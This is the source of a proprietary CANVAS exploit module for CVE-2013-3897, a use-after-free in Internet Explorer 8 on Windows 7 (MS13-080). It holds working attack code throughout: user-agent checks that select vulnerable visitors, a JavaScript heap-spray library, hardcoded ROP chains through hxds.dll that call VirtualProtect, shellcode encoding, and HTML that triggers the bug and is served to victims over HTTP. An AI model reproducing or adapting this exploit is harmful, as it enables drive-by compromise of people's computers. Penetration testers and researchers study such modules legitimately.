#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2010
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import struct
from exploitutils import *
from tcpexploit import *
from httpclientside import httpclientside
from libs.jsobfuscate.jsobfuscate import JSObfuscator
from libs.spkproxy import header, body
from exploitutils import randomstring

from encoder import *

NAME                              = 'ie_cdisplaypointer'
DESCRIPTION                       = 'IE CDisplayPointer Use-After-Free exploit'

DOCUMENTATION                     = {}
DOCUMENTATION['VENDOR']           = 'Microsoft'
DOCUMENTATION['References']       = ['http://blogs.technet.com/b/srd/archive/2013/10/08/ms13-080-addresses-two-vulnerabilities-under-limited-targeted-attacks.aspx']
DOCUMENTATION['Repeatability']    = 'Infinite'
DOCUMENTATION['VersionsAffected'] = '8'
DOCUMENTATION['CVE Name']         = 'CVE-2013-3897'
DOCUMENTATION['CVE Url']          = 'http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2013-3897'
DOCUMENTATION['Notes']            = """
"""

VERSION                           = '1.0'
PROPERTY                          = {}
PROPERTY['TYPE']                  = 'Exploit'
PROPERTY['SITE']                  = 'Clientside'
PROPERTY['ARCH']                  = [['Windows']]
PROPERTY['VERSION']               = ['XP', 'Vista', '7']
PROPERTY['MSADV']                 = 'MS13-080'
PROPERTY['DELIVERY']              = 'HTTP'
PROPERTY["Notes"]                 = """

This exploit abuses a Use after free vulnerability when trying to call execCommand(). 
When using trigger events and executing a "selectall" command, the CMshtmlEd Object is freed 
only if content is written to the page via an onselect event. A corresponding cleanup
routine for the CMshtmlEd will try and delete the object via CMshtmlEd::Release() 
leading to a use of the dangling pointer.

Tested on:
* Windows 7 Service Pack 1



"""

NOTES = """
This exploit requires Microsoft Office 2007
"""

CHANGELOG = """
"""

targets = {
    0:['N/A', None, 0]
}

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version      = 0
        self.name         = NAME
        self.nops         = ""
        self.filename     = randomstring(8) + ".html"
        self.plugin_info  = None # we want clientd to give us a plugin dict

        
    # check for IE versions and NT versions
    def is_vulnerable(self, info_dict):
        ua = info_dict['user_agent']
        # ie8 + win7

        if "MSIE 8.0" in ua and "NT 6.1" in ua:
            try:
                if info_dict['plugins']['Office'] in ('Office 2007 Plus', 'Office 2007'):
                    return 1
            except Exception:
                pass

        self.log("Not IE 6/7/8/9 on Windows XP/Vista/win7 - The target is still possibly vulnerable, but not to this exploit")
        return 0

    def generate_spray(self):
        HeapLib = """
        //   JavaScript Heap Exploitation library
        //   by Alexander Sotirov <asotirov@determina.com>
        //  
        //   Version 0.3
        //
        // Copyright (c) 2007, Alexander Sotirov
        // All rights reserved.
        // 
        // The HeapLib library is licensed under a BSD license, the text of which follows:
        // 
        // Redistribution and use in source and binary forms, with or without
        // modification, are permitted provided that the following conditions
        // are met:
        // 
        // 1. Redistributions of source code must retain the above copyright
        //    notice, this list of conditions and the following disclaimer.
        // 2. Redistributions in binary form must reproduce the above copyright
        //    notice, this list of conditions and the following disclaimer in the
        //    documentation and/or other materials provided with the distribution.
        // 3. Neither the name of Alexander Sotirov nor the name of Determina Inc.
        //    may be used to endorse or promote products derived from this software
        //    without specific prior written permission.
        // 
        // THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
        // AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
        // IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
        // ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT OWNER OR CONTRIBUTORS BE
        // LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR
        // CONSEQUENTIAL DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF
        // SUBSTITUTE GOODS OR SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS
        // INTERRUPTION) HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN
        // CONTRACT, STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE)
        // ARISING IN ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
        // POSSIBILITY OF SUCH DAMAGE.

        function heapLib() {
        }
        
        heapLib.ie = function(maxAlloc, heapBase) {
        
            this.maxAlloc = (maxAlloc ? maxAlloc : 65535);
            this.heapBase = (heapBase ? heapBase : 0x150000);
        
            // Allocate a padding string that uses maxAlloc bytes
            this.paddingStr = "AAAA";
        
            while (4 + this.paddingStr.length*2 + 2 < this.maxAlloc) {
                this.paddingStr += this.paddingStr;
            }
            
            // Create an array for storing references to allocated memory
            this.mem = new Array();
        
            // Call flushOleaut32() once to allocate the maximum size blocks
            this.flushOleaut32();
        }
        
        heapLib.ie.prototype.debug = function(msg) {
            void(Math.atan2(0xbabe, msg));
        }       
                
        heapLib.ie.prototype.debugHeap = function(enable) {
        
            if (enable == true)
                void(Math.atan(0xbabe));
            else
                void(Math.asin(0xbabe));
        }
                
        heapLib.ie.prototype.debugBreak = function(msg) {
            void(Math.acos(0xbabe));
        }
                
        heapLib.ie.prototype.padding = function(len) {
            if (len > this.paddingStr.length)
                throw "Requested padding string length " + len + ", only " + this.paddingStr.length + " available";
        
            return this.paddingStr.substr(0, len);
        }       
                
        heapLib.ie.prototype.round = function(num, round) {
            if (round == 0)
                throw "Round argument cannot be 0";
        
            return parseInt((num + (round-1)) / round) * round;
        }       
        
        heapLib.ie.prototype.hex = function(num, width)
        {
            var digits = "0123456789ABCDEF";
        
            var hex = digits.substr(num & 0xF, 1);
        
            while (num > 0xF) {
                num = num >>> 4;
                hex = digits.substr(num & 0xF, 1) + hex;
            }
        
            var width = (width ? width : 0);
        
            while (hex.length < width)
                hex = "0" + hex;
        
            return hex;
        }       
        
        heapLib.ie.prototype.addr = function(addr) {
            return unescape("%u" + this.hex(addr & 0xFFFF, 4) + "%u" + this.hex((addr >> 16) & 0xFFFF, 4));
        }
        
        heapLib.ie.prototype.allocOleaut32 = function(arg, tag) {
        
            var size;
        
            // Calculate the allocation size
            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;    // len + string data + null terminator
            else
                size = arg;
        
            // Make sure that the size is valid
            if ((size & 0xf) != 0)
                throw "Allocation size " + size + " must be a multiple of 16";
        
            // Create an array for this tag if doesn't already exist
            if (this.mem[tag] === undefined)
                this.mem[tag] = new Array();
        
            if (typeof arg == "string" || arg instanceof String) {
                // Allocate a new block with strdup of the string argument
                this.mem[tag].push(arg.substr(0, arg.length));
            }
            else {
                // Allocate the block
                this.mem[tag].push(this.padding((arg-6)/2));
            }
        }
        
        heapLib.ie.prototype.freeOleaut32 = function(tag) {
        
            delete this.mem[tag];
            
            // Run the garbage collector
            CollectGarbage();
        }
        
        heapLib.ie.prototype.flushOleaut32 = function() {
        
            this.debug("Flushing the OLEAUT32 cache");
        
            // Free the maximum size blocks and push out all smaller blocks
        
            this.freeOleaut32("oleaut32");
            
            // Allocate the maximum sized blocks again, emptying the cache
        
            for (var i = 0; i < 6; i++) {
                this.allocOleaut32(32, "oleaut32");
                this.allocOleaut32(64, "oleaut32");
                this.allocOleaut32(256, "oleaut32");
                this.allocOleaut32(32768, "oleaut32");
            }
        }
                
        heapLib.ie.prototype.alloc = function(arg, tag) {
        
            var size;
        
            // Calculate the allocation size
            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;    // len + string data + null terminator
            else
                size = arg;
        
            // Make sure that the size is valid
            if (size == 32 || size == 64 || size == 256 || size == 32768)
                throw "Allocation sizes " + size + " cannot be flushed out of the OLEAUT32 cache";
        
            // Allocate the block with the OLEAUT32 allocator
            this.allocOleaut32(arg, tag);
        }       
        
        heapLib.ie.prototype.free = function(tag) {
        
            // Free the blocks with the OLEAUT32 free function
            this.freeOleaut32(tag);
        
            // Flush the OLEAUT32 cache
            this.flushOleaut32();
        }
        
        heapLib.ie.prototype.gc = function() {
        
            this.debug("Running the garbage collector");
            CollectGarbage();
        
            this.flushOleaut32();
        }
        
        heapLib.ie.prototype.freeList = function(arg, count) {
        
            var count = (count ? count : 1);
        
            for (var i = 0; i < count; i++) {
                this.alloc(arg);
                this.alloc(arg, "freeList");
            }
            this.alloc(arg);
        
            this.free("freeList");
        }
        
        heapLib.ie.prototype.lookaside = function(arg, count) {
        
            var size;
        
            // Calculate the allocation size
            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;    // len + string data + null terminator
            else
                size = arg;
        
            // Make sure that the size is valid
            if ((size & 0xf) != 0)
                throw "Allocation size " + size + " must be a multiple of 16";
        
            if (size+8 >= 1024)
                throw("Maximum lookaside block size is 1008 bytes");
        
            var count = (count ? count : 1);
        
            for (var i = 0; i < count; i++)
                this.alloc(arg, "lookaside");
        
            this.free("lookaside");
        }
        
        heapLib.ie.prototype.lookasideAddr = function(arg)
        {
            var size;
        
            // Calculate the allocation size
            if (typeof arg == "string" || arg instanceof String)
                size = 4 + arg.length*2 + 2;    // len + string data + null terminator
            else
                size = arg;
        
            // Make sure that the size is valid
            if ((size & 0xf) != 0)
                throw "Allocation size " + size + " must be a multiple of 16";
        
            if (size+8 >= 1024)
                throw("Maximum lookaside block size is 1008 bytes");
        
            // The lookahead array starts at heapBase + 0x688. It contains a 48 byte
            // structure for each block size + header size in 8 byte increments.
        
            return this.heapBase + 0x688 + ((size+8)/8)*48;
        }"""
        
        HeapLib = HeapLib.replace("     ","")
        
        HeapSpray = """
        var heapObj = new heapLib.ie(0x10000);

        var code = unescape("%s");
        var nops = unescape("%s");

        while (nops.length < 0x1000) nops += nops;

        shellcode = nops.substr(0,0x800-code.length) + code;
        while(shellcode.length < 0x40000) shellcode += shellcode;
        var block = shellcode.substring(2, 0x40000-0x21);
        for (i=0;i<500;i++){
                heapObj.alloc(block);
        }""" % (urluencode(self.shellcode),urluencode(self.nops)) 
        
        HeapSpray = HeapSpray.replace("         ","")
        return HeapLib, HeapSpray
            
    def generateStageOneCode(self):
        self.log("Generating stage 1 shellcode")
        stack_pivot = []
        rop_code    = []
        rop         = ""
        
        self.log("Using hxds.dll ROP")
        
        if self.plugin_info['plugins']['Office'] == "Office 2007 Plus":
            
            self.nops = "\x51\xbe\xbd\x41"
            stack_pivot = [
                0x51c1ef51, # XCHG EAX, ESP # RETN
                0x41414141, # junk
            ]
            rop_code = [
                0x51bebd40, # POP ESI # RETN [hxds.dll] 
                0x41414141, # junk due to ret 4
                0x51bd10b8, # ptr to &VirtualProtect() [IAT hxds.dll]
                0x51c58f6c, # MOV EAX,DWORD PTR DS:[ESI] # RETN [hxds.dll] 
                0x51bdcba0, # XCHG EAX,ESI # RETN 0x00 [hxds.dll] 
                0x51c0778f, # POP EBP # RETN [hxds.dll] 
                0x51be4534, # & jmp esp [hxds.dll]
                0x51c3c8e6, # POP EBX # RETN [hxds.dll] 
                0x00000201, # 0x00000201-> ebx
                0x51c35ad3, # POP EDX # RETN [hxds.dll] 
                0x00000040, # 0x00000040-> edx
                0x51becf73, # POP ECX # RETN [hxds.dll] 
                0x51c6093e, # &Writable location [hxds.dll]
                0x51be4e9b, # POP EDI # RETN [hxds.dll] 
                0x51bd5383, # RETN (ROP NOP) [hxds.dll]
                0x51c4643d, # POP EAX # RETN [hxds.dll] 
                0x90909090, # nop
                0x51c3604e, # PUSHAD # RETN [hxds.dll] 
            ]
            
        elif self.plugin_info['plugins']['Office'] == "Office 2007":
            
            self.nops = "\xfe\x50\xc4\x51"
            stack_pivot = [
                0x51be4054, # xchg eax, esp # ret
            ]
            rop_code = [
                0x51c450fd,  # POP EAX # RETN [hxds.dll] 
                0x51bd1158,  # ptr to &VirtualProtect() [IAT hxds.dll]
                0x51c055ac,  # MOV EAX,DWORD PTR DS:[EAX] # RETN [hxds.dll] 
                0x51c39648,  # XCHG EAX,ESI # RETN [hxds.dll] 
                0x51c391cd,  # POP EBP # RETN [hxds.dll] 
                0x51c4bcf3,  # & jmp esp [hxds.dll]
                0x51bf5e81,  # POP EBX # RETN [hxds.dll] 
                0x00000201,  # 0x00000201-> ebx
                0x51bfa7d8,  # POP EDX # RETN [hxds.dll] 
                0x00000040,  # 0x00000040-> edx
                0x51c5273c,  # POP ECX # RETN [hxds.dll] 
                0x51c5f4cf,  # &Writable location [hxds.dll]
                0x51beceab,  # POP EDI # RETN [hxds.dll] 
                0x51c1e042,  # RETN (ROP NOP) [hxds.dll]
                0x51c05266,  # POP EAX # RETN [hxds.dll] 
                0x90909090,  # nop
                0x51c0a4ec,  # PUSHAD # RETN [hxds.dll] 
            ]

        for pivot in stack_pivot:
            rop += struct.pack('<L', pivot)
        for dword in rop_code:
            rop += struct.pack('<L', dword)
        return rop

    # create all our shellcode
    def createAndEncodeShellcode(self):
        self.createWin32ClientSideShellcode()
        self.shellcode = self.intel_encode(self.badstring, self.shellcode)
        
        # build our rop payload with MOSDEF
        self.shellcode = self.generateStageOneCode() + self.shellcode
    
    def makefile(self, request_header=None, stage=1):
        """
        Makes the exploit HTML
        """
        self.getArgs()
        if not hasattr(self, "shellcode") or not self.shellcode:
            self.log("Regenerating shellcode in makefile")
            self.createAndEncodeShellcode()
            
        if stage == 1:
            HeapLib, HeapSpray = self.generate_spray()
            filedata="""
            <!doctype html>
            <html>
            <head>
            <script type='text/javascript'>
            %s
            var a = Array();
            var junk = unescape("%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141");
            var eip = unescape("%%u0b30%%u131b");
            var junk2 = unescape("%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141%%u4141");
            var data = junk + eip + junk2;
            
            function createheap(){
                for (i = 0; i < 0x500; i++){
                    a[i] = document.createElement("button");
                }
                %s
            }
            
            function fillheap(){
                for(i=0; i < 0x500; i++)
                {
                    a[i].name = data;
                }
            }
            
            function jackson()
            {
                var bool = false;
                var CTextArea = document.createElement("textarea");
                var Child = document.createElement("address");
                document.body.appendChild(CTextArea);
                document.body.appendChild(Child);
                document.body.contentEditable="true";
                Child.applyElement(CTextArea);

                CTextArea.onselect=function(){
                Child.applyElement(document.createElement("div"));
                }

                CTextArea.onpropertychange=function(){
                if (bool){
                        createheap();
                        document.execCommand("Delete");
                        fillheap();
                        try{location.href='ms-help://'} catch(e){}
                        }
                }
                bool = true;
                CTextArea.select();
            }
            </script>
            </head>
            <body onload='jackson();'></body>
            </html>""" % (HeapLib, HeapSpray)
            
        filedata = filedata.replace("            ", "")
        return filedata

    def makesploit(self,clientheader,clientbody):
        h=header('SERVER')
        b=body()
        
        # set up the browser target
        ua = clientheader.getHeaderValue('User-Agent')
        
        if self.plugin_info:
            info_dict=self.plugin_info
            self.log("We got a plugin info for this target - thanks clientd!")
            
            if self.is_vulnerable(self.plugin_info):
                self.log("This client is most likely vulnerable!")
            else:
                self.log("Bailing on this client as it is not likely to be vulnerable (%s)" % self.plugin_info.get("language"))
                return None, None
            
        if clientheader.URL.count(self.filename):
            self.log('Serving stage 1 HTML file')
            self.createAndEncodeShellcode()
            stage1html = self.makefile(request_header = clientheader, stage=1)
            b.setBody(stage1html)
            h.addHeader('Content-Type','text/html')
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.filename)
            h.addHeader('Content-Type','text/html')
        return h,b

        
    def getArgs(self):
        self.host=self.target.interface
        self.getarg("filename")
        
    def displayVersions(self):
        for t in targets.keys():
            print 'Version %d: %s'%(t,targets[t][0])

    def run(self):
        self.getArgs()
        filedata = self.makefile()
        
        self.log('Opening %s for output'%(self.filename))
        
        fd=file(self.filename,'wb+')
        fd.write(filedata)
        fd.close()
        self.log('Wrote to %s'%(self.filename))
        return 1

if __name__=='__main__':
    print 'Running CANVAS %s Exploit v %s'%(DESCRIPTION,VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    if ret not in [0,1,None]: ret.interact()
